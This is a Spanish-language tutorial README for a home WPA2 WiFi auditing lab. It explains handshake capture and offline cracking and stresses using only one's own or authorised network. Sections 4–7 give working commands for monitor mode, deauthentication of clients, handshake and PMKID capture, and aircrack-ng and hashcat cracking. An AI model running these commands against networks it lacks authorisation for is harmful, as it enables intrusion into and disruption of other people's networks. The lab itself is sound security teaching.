# Laboratorio de auditoría WiFi WPA/WPA2

> **Antes que nada — la regla que hace que esto sea "ético":**
> úsalo **solo contra tu propia red o una red con autorización escrita**. Auditar la WiFi de
> un vecino, una empresa o un café sin permiso es delito en casi todos los países (en varios,
> el simple hecho de *capturar* el tráfico ya lo es), y "era una prueba" no es una defensa.
> El montaje de abajo usa **un router tuyo** precisamente para que todo lo que hagas sea legal.

Este paquete tiene dos cosas:
- `auditar-wifi.sh` — automatiza el flujo completo (monitor → escaneo → captura de handshake → crackeo).
- Este `LEEME.md` — el porqué de cada paso, el método manual (para que aprendas, no para que copies a ciegas), las alternativas y los problemas típicos.

---

## 0. Qué vas a aprender realmente

WPA/WPA2-PSK (la WiFi doméstica típica) no se "rompe" en el aire. Lo que se hace es:

1. **Capturar el *4-way handshake***: el saludo cifrado que un dispositivo y el router intercambian
   al conectarse. No contiene la contraseña, pero sí un valor derivado de ella.
2. **Crackearlo *offline***: en tu PC, pruebas millones de contraseñas candidatas contra ese
   handshake hasta que una genera el mismo valor. Es un **ataque de diccionario/fuerza bruta**, no
   una vulnerabilidad del protocolo.

**La consecuencia práctica** (y la lección de seguridad más importante para un router propio): si la
clave es larga y aleatoria, **no cae** — no hay diccionario ni GPU que la alcance en tiempo humano.
Lo que cae son las claves cortas, de diccionario o predecibles. Ese es exactamente el aprendizaje que
te llevas: *por qué* una WiFi bien configurada es segura y una mal configurada no.

---

## 1. Monta el laboratorio (10 minutos)

1. **Un router que controles.** Puede ser tu router de casa o, mejor aún, uno viejo / uno barato
   dedicado a practicar. Entra a su panel (normalmente `192.168.1.1` o `192.168.0.1`).
2. **Ponle seguridad WPA2-PSK (AES).** Evita "WPA3-only" para las primeras prácticas: WPA3 usa SAE y
   no cae con este método (lo cual, de nuevo, es la lección).
3. **Pon una contraseña de prueba que SÍ esté en el diccionario**, para poder ver el crackeo
   funcionar de punta a punta. Ejemplos que están en `rockyou.txt`: `password1`, `iloveyou`,
   `superman`. Cuando lo hayas visto funcionar, cámbiala por una larga y aleatoria y comprueba con
   tus propios ojos que **ya no cae**: ese contraste es el ejercicio completo.
4. **Ten un dispositivo conectado** a esa WiFi (tu propio móvil). Lo necesitas para el paso del
   handshake: es *tu* móvil el que hará el saludo.

---

## 2. Qué necesitas en la máquina atacante

**Sistema operativo:** Kali Linux. Tres formas:
- **USB en vivo (recomendado para empezar):** graba Kali en un USB con Rufus/balenaEtcher y arranca
  desde él. Cero instalación, el adaptador WiFi se pasa nativo.
- **Máquina virtual (VirtualBox/VMware):** funciona, pero **el WiFi interno del portátil casi nunca
  sirve** en VM; necesitas un adaptador USB y pasárselo a la VM (USB passthrough).
- **WSL2 en Windows:** *no* sirve para esto — no da acceso al radio en modo monitor. Descártalo.

**Hardware WiFi — la pieza clave.** El adaptador debe soportar **modo monitor + inyección de
paquetes**. La mayoría de tarjetas internas de portátil **no** inyectan bien. Adaptadores USB que
funcionan de fábrica en Kali:
- **Alfa AWUS036ACH / AWUS036ACM** (doble banda, chip Realtek RTL8812AU / MediaTek MT7612U).
- **Alfa AWUS036NHA** (chip **Atheros AR9271**, solo 2.4 GHz, pero es el más "sin dramas" para aprender).
- **TP-Link TL-WN722N v1** (AR9271; ojo: **solo la v1**, las v2/v3 cambiaron de chip y no inyectan).

Comprueba que Kali lo ve:
```
lsusb          # debe listar el adaptador
iw dev         # debe aparecer como wlan0 / wlan1...
```

**Herramientas** (ya vienen en Kali; si no):
```
sudo apt update && sudo apt install -y aircrack-ng iw hcxtools hashcat wireshark
```
El diccionario `rockyou.txt` está en `/usr/share/wordlists/rockyou.txt.gz` — descomprímelo con
`sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz`.

---

## 3. La forma rápida — el script

Copia `auditar-wifi.sh` a la máquina Kali y:
```
chmod +x auditar-wifi.sh
sudo ./auditar-wifi.sh
```
Te va guiando: elige el adaptador, escanea, apunta el **BSSID** y **CH** de tu red, y captura. Cuando
quieras forzar el handshake sin esperar a que alguien se conecte solo, el propio script te da el
comando de *deauth* para lanzarlo en otra terminal (contra tu propio móvil). Al final crackea con
`rockyou.txt`. Al salir **restaura tu adaptador** para que vuelvas a navegar.

---

## 4. La forma manual — para entender cada pieza

Hazlo así al menos una vez; es lo que preguntan en un examen o una entrevista.

```bash
# 1) Modo monitor (mata lo que interfiere y activa la escucha)
sudo airmon-ng check kill
sudo airmon-ng start wlan0            # -> crea wlan0mon

# 2) Escanea el aire. Anota BSSID (MAC del router) y CH (canal) de TU red. Ctrl-C para parar.
sudo airodump-ng wlan0mon

# 3) Enfoca SOLO tu red y ponte a grabar. Deja esta terminal abierta.
#    En la esquina superior derecha aparecera "WPA handshake: <BSSID>" cuando lo captures.
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w captura wlan0mon

# 4) (Otra terminal) Fuerza la reconexion de TU dispositivo para provocar el handshake.
#    Expulsa a tu movil un instante; al reconectarse, hace el saludo. 5 paquetes bastan.
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5) Verifica que lo tienes
sudo aircrack-ng captura-01.cap       # debe decir "1 handshake"

# 6) Crackea offline con diccionario
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF captura-01.cap

# 7) Restaura tu WiFi normal
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

**Qué es cada cosa:**
- **BSSID** = la MAC del router. **ESSID** = el nombre visible de la red. **CH** = el canal.
- **`--deauth`** manda paquetes de "desautenticación". Es el único paso que *toca* la red en vivo;
  por eso solo va contra tu propio equipo. Con un router propio, incluso puedes saltarte el deauth y
  simplemente reconectar el móvil a mano.

---

## 5. Alternativa todo-en-uno: `wifite`

`wifite` automatiza los pasos 1–6 y elige la mejor estrategia por ti:
```
sudo wifite
```
Escanea, lo listas, eliges tu red por número, y él captura el handshake (lanza deauth solo) y hasta
lo crackea si le pasas diccionario. Bueno para ver el flujo; el método manual es mejor para *entenderlo*.

---

## 6. Crackeo serio: hashcat con GPU

`aircrack-ng` cracea en CPU (lento). Con GPU, `hashcat` es órdenes de magnitud más rápido. Convierte
el `.cap` al formato moderno **22000** y lánzalo:
```bash
# Convertir .cap/.pcapng -> .hc22000  (paquete hcxtools)
hcxpcapngtool -o handshake.hc22000 captura-01.cap

# Ataque de diccionario (modo 22000 = WPA-PBKDF2-PMKID+EAPOL)
hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt

# Con reglas (genera variantes: Password -> P@ssw0rd, etc.)
hashcat -m 22000 handshake.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Fuerza bruta por mascara (ej. 8 digitos, tipico de claves por defecto)
hashcat -m 22000 handshake.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```

---

## 7. Método sin cliente: PMKID (clientless)

Muchos routers sueltan un **PMKID** sin necesidad de que haya nadie conectado ni de hacer deauth:
```bash
sudo hcxdumptool -i wlan0mon -o volcado.pcapng --enable_status=1
hcxpcapngtool -o pmkid.hc22000 volcado.pcapng
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt
```
Útil cuando tu router de lab no tiene dispositivos conectados. (No todos los routers son vulnerables
a PMKID; también es una buena lección de por qué.)

---

## 8. Problemas típicos

| Síntoma | Causa / arreglo |
|---|---|
| `iw dev` no muestra el adaptador | Chip sin driver o no pasado a la VM. `lsusb`, revisa passthrough USB. |
| Monitor mode falla | `sudo airmon-ng check kill` primero. Tarjeta interna que no lo soporta → usa el USB. |
| Nunca aparece el handshake | Debe haber un dispositivo que se (re)conecte. Lanza deauth contra TU equipo, o reconéctalo a mano. |
| Deauth "no hace nada" | Adaptador sin inyección. Verifica con `sudo aireplay-ng --test wlan0mon`. |
| aircrack no encuentra la clave | La clave no está en el diccionario. Es el resultado esperado si es fuerte. Prueba reglas/máscara o acéptalo. |
| Se cayó tu internet tras practicar | Faltó restaurar: `sudo airmon-ng stop wlan0mon && sudo systemctl restart NetworkManager`. |

---

## 9. Para seguir aprendiendo (legal y guiado)

- **Hack The Box** y **TryHackMe**: laboratorios remotos autorizados; TryHackMe tiene salas de WiFi.
- **La wiki oficial de aircrack-ng** (`aircrack-ng.org`): la referencia canónica de cada comando.
- El siguiente paso natural es **WPA3/SAE** y por qué este ataque no le funciona — el mejor cierre
  para entender qué cambió y qué sigue siendo vulnerable (p. ej. ataques *downgrade* a redes de transición).

> Recordatorio final: todo lo de arriba es tu campo de tiro privado. Fuera de él —redes que no son
> tuyas y sin permiso escrito— estas mismas herramientas te meten en un problema legal serio.
> El valor profesional está en saber hacerlo *y* saber dónde para la línea.
